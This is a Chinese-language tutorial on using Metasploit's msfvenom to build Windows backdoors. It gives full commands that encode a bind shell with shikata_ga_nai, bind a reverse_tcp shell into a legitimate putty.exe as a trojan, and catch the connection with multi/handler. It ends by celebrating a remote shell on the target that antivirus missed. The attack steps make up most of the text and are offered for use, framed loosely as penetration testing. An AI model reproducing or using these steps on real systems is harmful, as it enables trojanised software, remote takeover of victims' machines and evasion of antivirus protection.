　　msfvenom简介：

　　众所周知，Metasploit是渗透测试中的神器，Metasploit中有各种非常有用的模块，比如MSFpayload和MSFencode。我们 可以利用MSFpayload生成各种类型的shellcode，完成各种exploit的编写。我们可以利用MSFencode来完成对 shellcode编码，加密，生成backdoor等。通常我们使用命令管道来完成先生成shellcode然后编码shellcode。Metasploit中的MSFvenom模块，它集成了MSFpayload和MSFencode的功能。


　　使用MSFvenom生成backdoor进行渗透


　　通常，我们在渗透的时候需要在目标主机上安装后门。考虑到目标主机有可能存在防火墙或者在NAT后。因此我们使用反弹shell，即payload为windows/shell/reverse_tcp为例。


　　演示：


　　先开启kali终端：


　　1.首先输入：msfvenom -h 查看一下msfvenom的帮助文件，了解一下命令和作用。

　　


　　解释:


　　-p, --payload指定需要使用的payload(攻击荷载)。


　　-l, --list [module_type] 列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all


　　-n, --nopsled为payload预先指定一个NOP滑动长度

　　-f, --format指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)

　　-e, --encoder [encoder] 指定需要使用的encoder(编码器)

　　-a, --arch指定payload的目标架构

　　--platform指定payload的目标平台

　　-s, --space设定有效攻击荷载的最大长度

　　-b, --bad-chars设定规避字符集，比如: '\x00\xff'

　　-i, --iterations指定payload的编码次数

　　-c, --add-code指定一个附加的win32 shellcode文件

　　-x, --template指定一个自定义的可执行文件作为模板

　　-k, --keep 保护模板程序的动作，注入的payload作为一个新的进程运行

　　--payload-options 列举payload的标准选项

　　-o, --out保存payload

　　-v, --var-name指定一个自定义的变量，以确定输出格式

　　--shellest 最小化生成payload

　　-h, --help 查看帮助选项

　　--help-formats 查看msf支持的输出格式列表

　　2.我们生成一个raw型的payload:

　　


　　命令：

　　msfvenom -a x86 -e x86/shikata_ga_nai --platform windows -p windows/shell_bind_tcp LPORT=本地端口 -f raw >bindtcp

　　解释：

　　-a x86 目标是32位系统

　　-e x86/shikata_ga_nai 一种编码技术

　　--platform 指定payload的目标平台 如:windows

　　-p 指定需要使用的payload(攻击荷载)

　　LPORT=本地端口

　　-f 指定输出格式

　　3.然后我们将这个payload追加到另一个payload上，生成exe文件：

　　


　　命令：

　　msfvenom -c bindtcp -a x86 -e x86/shikata_ga_nai --platform Windows -p windows/messagebox TEXT="bindtcp and msgbox" -f exe > test.exe

　　解释：

　　-c 指定一个附加的win32 shellcode文件 (shellcode实际是一段代码(也可以是填充数据)，是用来发送到服务器利用特定漏洞的代码，一般可以获取权限。)

　　-a x86 目标是32位系统

　　-e x86/shikata_ga_nai 一种编码技术

　　--platform 指定payload的目标平台 如:windows

　　-p 指定需要使用的payload(攻击荷载)

　　-f 指定输出格式

　　4.把木马和正常文件进行捆绑：

　　


　　命令：

　　msfvenom -a x86 --platform windows -x /opt/putty.exe(根据你文件的实际目录来写) -k -p windows/shell/reverse_tcp LHOST=本地IP LPORT=本地端口 -e x86/shikata_ga_nai -f exe > testtmp.exe

　　解释：

　　-a x86 目标是32位系统

　　--platform 指定payload的目标平台 如:windows

　　-k 保护模板程序的动作，注入的payload作为一个新的进程运行

　　-p 指定需要使用的payload(攻击荷载)

　　LHOST=本地IP

　　LPORT=本地端口

　　-e x86/shikata_ga_nai 一种编码技术

　　-f 指定输出格式

　　> testtmp.exe 最后的输出文件

　　操作完成之后看一下生成的木马文件testtmp.exe。

　　然后准备攻击!

　　5.进入msfconsole：

　　我们在kali使用msfconsole配置好，准备监听反弹的shell。

　　命令：

　　msfconsole

　　6.启动攻击：

　　


　　命令：

　　use exploit/multi/handler

　　show options (查看当前设置)

　　set LHOST 本地IP

　　set LPORT 本地端口

　　exploit (开始监听)

　　然后我们在目标主机上执行木马(利用putty作为模板，一个包含反弹shell的backdoor)。

　　7.连接上之后：

　　


　　命令：

　　shell

　　然后就看见了目标主机的c盘路径，就是说你已经拿到了shell，而且木马没有没杀毒软件杀掉，成功的做了一个免杀潜伏的效果!
